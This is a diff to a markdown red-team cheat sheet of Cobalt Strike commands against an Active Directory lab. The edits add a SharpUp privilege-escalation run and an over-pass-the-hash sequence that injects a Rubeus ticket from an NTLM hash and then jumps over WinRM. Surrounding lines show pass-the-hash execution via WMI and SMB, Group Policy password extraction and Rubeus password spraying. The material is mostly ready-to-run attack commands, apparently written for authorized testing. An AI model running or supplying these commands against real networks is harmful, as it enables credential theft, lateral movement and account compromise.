@@ -38,10 +38,16 @@ powershell ADRecon -OutputDir .\ -DomainController ops-dc.lab.com
 ```
 -----------------------------------------------------------------------------------------
 ## Local Privilege Escalation
-### PowerUp - PowerSploit module
+### (PowerUp)[https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1] - PowerSploit module
 ```
 powershell-import --> PowerUp.ps1
-powershell Invoke-AllChecks | Out-File -Encoding ASCII PowerUp-checks.txt
+powerpick Invoke-AllChecks | Out-File -Encoding ASCII PowerUp-checks.txt
+```
+
+### (SharpUp)[https://github.com/GhostPack/SharpUp] - .NET port of PowerUp
+```
+# Run all checks automatically
+execute-assembly C:\SharpUp.exe
 ```
 
 ### [SeatBelt](https://github.com/GhostPack/Seatbelt) - .NET tool by GhostPack  
@@ -120,6 +126,17 @@ powerpick Invoke-WMIExec -Target 192.168.100.20 -Domain LAB.com -Username TEST -
 powerpick Invoke-SMBExec -Target 192.168.100.20 -Domain LAB.com -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Command "command or launcher to execute" -verbose
 ```
 
+Over-pass-the-hash with Rubeus
+Inject a ticket into memory using known credentials and then move to a system that user has access to
+```
+# Revert to original token in CS
+rev2self
+# Inject new ticket into memory
+execute-assembly C:\Rubeus.exe asktgt /domain:lab.com /user:admin1 /rc4:<NTLM hash> /ptt
+# Run network commands as that user
+jump winrm64 jumpbox.lab.com
+```
+
 [Move Kit](https://github.com/0xthirteen/MoveKit)
 Aggressor script using execute-assembly, SharpMove and SharpRPD assemblies for doing lateral movement with various techniques
 
@@ -136,7 +153,7 @@ powerpick Get-GPPPassword -Server ops-dc01.lab.com
 ```
 execute-assembly C:\Net-GPPPassword.exe lab.com
 ```
-[Get-GPPAutologon](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPAutologon.ps1) PowerSploit module
+[Get-GPPAutologon.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPAutologon.ps1) PowerSploit module
 ```
 # Get-GPPAutologn searches the domain controller for registry.xml to find autologon information and returns the username and password
 powershell-import --> Get-GPPAutologon.ps1
@@ -160,7 +177,7 @@ Rubeus brute-force password spraying a single password or using a password file
 ```
 execute-assembbly C:\Rubeus.exe brute /password:Password123! /domain:lab.com /noticket /outfile:passes-sprayed.txt [/passwords:PASSWORDS_FILE>] [/user:USER | /users:USERS_FILE] [/creduser:DOMAIN\\USER & /credpassword:PASSWORD] [/dc:DOMAIN_CONTROLLER]  [/verbose] [/nowrap]
 ```
-[SharpSpray](https://github.com/jnqpblc/SharpSpray) - C# port of PowerSpray.ps1
+[SharpSpray](https://github.com/jnqpblc/SharpSpray) - .NET port of PowerSpray.ps1
 ```
 # By default it will automatically generate a user list from the domain using LDAP
 # Sleeps 30 minutes between each password cycle, delays 300 milliseconds between each password guess attempt
